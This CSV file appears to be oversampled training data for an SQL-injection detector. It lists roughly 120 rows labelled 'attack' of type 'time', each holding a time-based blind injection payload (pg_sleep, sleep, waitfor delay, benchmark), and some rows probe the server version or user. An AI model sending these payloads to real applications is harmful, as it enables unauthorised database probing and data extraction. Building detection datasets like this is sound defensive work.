id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001126,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,1.2492800187171134
SMOTE_001127,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.35484724505807436
SMOTE_001128,attack,time,1 where 6223  =  6223 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000131,0.6826386966783604
SMOTE_001129,attack,time,"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp",nearest_attack_euclidean,R000099,0.21955972450031117
SMOTE_001130,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.4937367242151318
SMOTE_001131,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,0.07387984321929945
SMOTE_001132,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,nearest_attack_euclidean,R000094,0.5491115789835587
SMOTE_001133,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,1.2315309516692994
SMOTE_001134,attack,time,1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000060,1.9294846226970659
SMOTE_001135,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,0.8430195275839936
SMOTE_001136,attack,time,1  )   as hlcn where 1165  =  1165 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000153,0.5181256769596932
SMOTE_001137,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,0.8360997912752357
SMOTE_001138,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.4214091037254015
SMOTE_001139,attack,time,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""epfg"" like ""epfg",nearest_attack_euclidean,R000128,1.2741645812739522
SMOTE_001140,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,1.4159265504622436
SMOTE_001141,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,0.24855457702823464
SMOTE_001142,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.13929455884425287
SMOTE_001143,attack,time,1'+  (  select 'nlvq' where 7528  =  7528 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000120,3.9045272696117075
SMOTE_001144,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,0.5407754854539316
SMOTE_001145,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000134,0.7990054138333301
SMOTE_001146,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,nearest_attack_euclidean,R000094,1.2749942675340453
SMOTE_001147,attack,time,waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,nearest_attack_euclidean,R000144,0.03977487200764751
SMOTE_001148,attack,time,1 where 6223  =  6223 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000131,0.7376346311042808
SMOTE_001149,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",nearest_attack_euclidean,R000046,0.3565169915671026
SMOTE_001150,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,2.0746597060710004
SMOTE_001151,attack,time,1  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000088,0.6673712218631634
SMOTE_001152,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,1.0662553138003352
SMOTE_001153,attack,time,"1""  )   where 7165  =  7165 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000118,1.7781456776018219
SMOTE_001154,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,0.702202151597042
SMOTE_001155,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.048279608766483
SMOTE_001156,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.5196716500839402
SMOTE_001157,attack,time,1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,nearest_attack_euclidean,R000089,0.25539986912777596
SMOTE_001158,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,1.019308216567289
SMOTE_001159,attack,time,"1   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  9558  =  9558",nearest_attack_euclidean,R000101,0.8203951144804886
SMOTE_001160,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.07609517782736061
SMOTE_001161,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.49711351159597195
SMOTE_001162,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,0.6970224238011936
SMOTE_001163,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,2.0854020024340847
SMOTE_001164,attack,time,"1""   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000056,0.24369092687489152
SMOTE_001165,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,0.7484905633191973
SMOTE_001166,attack,time,"select sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000152,1.5386880364131752
SMOTE_001167,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,1.0055520383492622
SMOTE_001168,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,1.604841390182235
SMOTE_001169,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.08299916036572849
SMOTE_001170,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,0.39990645878214137
SMOTE_001171,attack,time,"1%""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000090,1.7130550919416019
SMOTE_001172,attack,time,"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000126,0.5662777605821947
SMOTE_001173,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,2.5258957133634454
SMOTE_001174,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.4413819683474988
SMOTE_001175,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.17878136872015918
SMOTE_001176,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.7992827683803263
SMOTE_001177,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000100,0.8150639896726746
SMOTE_001178,attack,time,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,nearest_attack_euclidean,R000137,0.9739450075616899
SMOTE_001179,attack,time,"1'||  (  select 'kojx' from dual where 8140  =  8140 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000061,3.622225012036785
SMOTE_001180,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.5778018280767784
SMOTE_001181,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000096,0.7697794550372413
SMOTE_001182,attack,time,"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000083,0.432517950413834
SMOTE_001183,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,1.8261849807518131
SMOTE_001184,attack,time,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',nearest_attack_euclidean,R000148,0.6366994201810188
SMOTE_001185,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,1.5280845487021066
SMOTE_001186,attack,time,1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000125,0.46446259056412204
SMOTE_001187,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",nearest_attack_euclidean,R000076,1.047197348021856
SMOTE_001188,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000138,0.4000525294811563
SMOTE_001189,attack,time,begin dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000140,1.8016816064744943
SMOTE_001190,attack,time,1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000125,0.21958207236499883
SMOTE_001191,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,0.0838416405601351
SMOTE_001192,attack,time,begin dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000140,1.6605818948262097
SMOTE_001193,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,0.6771904205296716
SMOTE_001194,attack,time,"1%""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000090,0.3254538842024788
SMOTE_001195,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,0.5659479985394552
SMOTE_001196,attack,time,"1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000051,0.6459858625338949
SMOTE_001197,attack,time,select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx,nearest_attack_euclidean,R000117,0.025943364987913844
SMOTE_001198,attack,time,waitfor delay '0:0:5' and 'dfzn'  =  'dfzn,nearest_attack_euclidean,R000144,0.328621397681141
SMOTE_001199,attack,time,""" or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000040,2.182754854751025
SMOTE_001200,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.5118129259242616
SMOTE_001201,attack,time,1  )   as hlcn where 1165  =  1165 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000153,1.1126703018777293
SMOTE_001202,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.12579322065711646
SMOTE_001203,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,1.6577366056897933
SMOTE_001204,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.5724875361630256
SMOTE_001205,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,1.6718327450421944
SMOTE_001206,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.506217130255683
SMOTE_001207,attack,time,1' waitfor delay '0:0:5'--,nearest_attack_euclidean,R000156,1.422837845549891
SMOTE_001208,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,0.28826359744994334
SMOTE_001209,attack,time,1   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000048,1.0923149207165768
SMOTE_001210,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,1.4840025856459254
SMOTE_001211,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000037,0.006111617831735326
SMOTE_001212,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.295748625131106
SMOTE_001213,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,0.5318762816204138
SMOTE_001214,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,0.7673148334931099
SMOTE_001215,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0
SMOTE_001216,attack,time,"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000064,0.3284370688906347
SMOTE_001217,attack,time,"select sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000152,1.0244974109887939
SMOTE_001218,attack,time,"1%""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000090,0.9774920271323326
SMOTE_001219,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.10392512247477054
SMOTE_001220,attack,time,"1"" and sleep  (  5  )   and ""tdid"" like ""tdid",nearest_attack_euclidean,R000121,2.6447469964193586
SMOTE_001221,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000100,0.46378880474951706
SMOTE_001222,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.030905420624540176
SMOTE_001223,attack,time,"1""  )   as gdcx where 2335  =  2335 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000142,1.2578221434445838
SMOTE_001224,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,0.05950393621072978
SMOTE_001225,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,1.2274032334000653
SMOTE_001226,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.18893950427289755
SMOTE_001227,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,nearest_attack_euclidean,R000150,1.6715789706768436
SMOTE_001228,attack,time,"1%""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000090,0.017753530727106972
SMOTE_001229,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,1.6617655922590724
SMOTE_001230,attack,time,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',nearest_attack_euclidean,R000148,0.4793041439255145
SMOTE_001231,attack,time, (  select   (  case when   (  9856  =  9856  )   then sleep  (  5  )   else 9856*  (  select 9856 from information_schema.character_sets  )   end   )    ) ,nearest_attack_euclidean,R000132,1.1330694048469754
SMOTE_001232,attack,time,"1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000123,1.5534984174577389
SMOTE_001233,attack,time,1  )   as hlcn where 1165  =  1165 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000153,0.9319891998775539
SMOTE_001234,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""vjlr"" like ""vjlr",nearest_attack_euclidean,R000145,0.9295672278821074
SMOTE_001235,attack,time,"1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000078,2.0797549063628327
SMOTE_001236,attack,time,select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,nearest_attack_euclidean,R000084,1.2599912722109468
SMOTE_001237,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,1.0049638232950953
SMOTE_001238,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000149,0.08560372237765561
SMOTE_001239,attack,time,1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000136,1.0287733880449237
SMOTE_001240,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,0.09370528702720872
SMOTE_001241,attack,time,""" or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000040,1.7080464502099466
SMOTE_001242,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,nearest_attack_euclidean,R000112,1.4913808709166765
SMOTE_001243,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.13371814922041783
SMOTE_001244,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.15787162262291893
SMOTE_001245,attack,time,1  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000088,0.24186368344461506
SMOTE_001246,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,1.8877514990952309
